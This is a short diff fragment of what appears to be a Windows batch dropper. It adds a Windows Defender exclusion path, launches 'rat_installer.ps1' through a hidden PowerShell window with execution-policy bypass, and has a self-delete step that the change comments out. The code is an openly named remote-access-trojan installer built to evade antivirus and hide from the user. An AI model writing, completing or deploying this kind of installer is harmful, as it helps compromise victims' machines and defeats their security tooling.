@@ -35,4 +35,4 @@ Add-MpPreference _exclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/W
 powershell powershell.exe -windowstyle hidden -ep bypass ./rat_installer.ps1
 
 @REM self delete
-del wget.cmd
+@REM del wget.cmd
